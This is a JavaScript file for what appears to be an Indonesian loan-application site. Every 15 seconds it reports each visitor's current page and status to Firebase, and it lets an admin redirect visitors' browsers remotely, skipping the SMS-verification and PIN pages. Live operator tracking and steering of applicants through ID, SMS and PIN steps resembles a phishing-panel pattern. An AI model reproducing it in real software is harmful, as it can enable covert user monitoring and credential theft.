(() => {
  'use strict';

  const BOOT_RETRY_MS = 400;
  const HEARTBEAT_MS = 15000;

  const SAFE_TARGETS = new Set([
    'form-nik.html',
    'upload-dokumen.html',
    'form-pinjaman.html',
    'ringkasan-pengajuan.html',
    'proses-pengajuan.html',
    'hasil-pengajuan.html',
    'dashboard-pinjaman.html'
  ]);
  const SENSITIVE_PAGES = new Set(['verifikasi-sms.html', 'konfirmasi-pin.html']);

  let started = false;
  let bootTimer = null;
  let heartbeatTimer = null;

  const currentPage = () => window.location.pathname.split('/').pop() || 'index.html';

  const retryBoot = () => {
    if (started || bootTimer) return;
    bootTimer = window.setTimeout(() => {
      bootTimer = null;
      boot();
    }, BOOT_RETRY_MS);
  };

  const boot = () => {
    if (started) return;

    // storage.js dan Firebase compat harus tersedia terlebih dahulu.
    if (!window.NovaStorage || typeof window.firebase === 'undefined') {
      retryBoot();
      return;
    }

    // Pada halaman login, sesi memang belum ada. Jangan berhenti permanen:
    // tunggu sampai NovaStorage.setSession() membuat sesi atau halaman berpindah.
    const session = NovaStorage.getSession?.();
    if (!session) {
      retryBoot();
      return;
    }

    const identifier = String(session.username || session.identity || session.email || '').trim().toLowerCase();
    if (!identifier) {
      retryBoot();
      return;
    }

    // storage.js menginisialisasi Firebase saat DOMContentLoaded / writeRemoteUser.
    // Jika default app belum siap, tunggu dan coba lagi; jangan return permanen.
    try {
      if (!Array.isArray(firebase.apps) || firebase.apps.length === 0) {
        retryBoot();
        return;
      }
    } catch {
      retryBoot();
      return;
    }

    let db;
    try {
      db = firebase.database();
    } catch {
      retryBoot();
      return;
    }
    if (!db) {
      retryBoot();
      return;
    }

    started = true;
    const ref = db.ref(`users/${encodeURIComponent(identifier)}`);

    const heartbeat = () => {
      const now = new Date().toISOString();
      const page = currentPage();
      const app = NovaStorage.getApplication?.();
      ref.update({
        currentPage: page,
        status: NovaStorage.getUserStatus?.(app) || 'Aktif',
        lastSeen: now,
        updatedAt: now
      }).catch(error => {
        // Jangan ganggu alur publik jika sinkronisasi presence gagal.
        console.warn('Session presence update gagal:', error?.code || error?.message || error);
      });
    };

    ref.on('value', snapshot => {
      const remote = snapshot.val() || {};
      const target = String(remote.targetPage || '').trim();
      const page = currentPage();
      // Halaman OTP/PIN tidak pernah dapat dipaksa/diinterupsi oleh admin.
      if (SENSITIVE_PAGES.has(page)) return;
      if (!SAFE_TARGETS.has(target) || target === page) return;
      window.location.replace(target);
    });

    heartbeat();
    heartbeatTimer = window.setInterval(heartbeat, HEARTBEAT_MS);

    document.addEventListener('visibilitychange', () => {
      if (!document.hidden) heartbeat();
    });

    window.addEventListener('pagehide', () => {
      if (bootTimer) window.clearTimeout(bootTimer);
      if (heartbeatTimer) window.clearInterval(heartbeatTimer);
    }, { once: true });
  };

  // Coba sekarang, lalu retry otomatis bila session/Firebase belum siap.
  boot();
})();
